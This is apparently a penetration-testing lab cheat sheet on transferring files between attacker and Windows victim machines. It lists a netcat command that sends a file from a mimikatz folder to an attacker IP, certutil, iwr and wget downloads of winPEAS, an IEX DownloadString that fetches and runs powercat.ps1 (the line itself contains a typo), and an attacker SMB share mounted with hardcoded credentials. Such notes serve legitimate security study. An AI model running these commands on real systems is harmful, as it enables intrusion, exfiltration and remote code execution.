#### Transfer to Linux

>[!code]- From Linux or Windows
>On the sending machine
>```powershell
>nc 192.168.118.2 443 < C:\tools\mimikatz\x64\file.txt
>```
#### Transfer to Windows

>[!code]- From Linux or Windows
>On the receiving Windows machine:
>```powershell
>PS C:\Users\dave> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
>```
>___
>```powershell
>PS C:\Users\dave> wget -uri http://192.168.118.2/winPEASx64.exe -OutFile winPEAS.exe
>```
>___
>```powershell
>PS C:\Users\dave> IEX (New-ObjectSystem Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1")
>```
>___
>```powershell
>PS C:\Users\dave> certutil -urlcache -split -f "http://192.168.118.2:8000/winPEASx64.exe" winPEAS.exe
>```

>[!code]- From Linux
>On the sending Linux machine:
>```bash
>impacket-smbserver attacker $(pwd) -smb2support -user bubbleman -password bubbleman
>```
>On the receiving Windows machine:
>```powershell
>$pass = convertto-securestring 'bubbleman' -asplaintext -force
>
$cred = new-object system.management.automation.PSCredential('bubbleman',$pass)
>
new-psdrive -name bubbleman -psprovider filesystem -credential $cred -root \\10.10.14.7\attacker
>
cd bubbleman:
>```

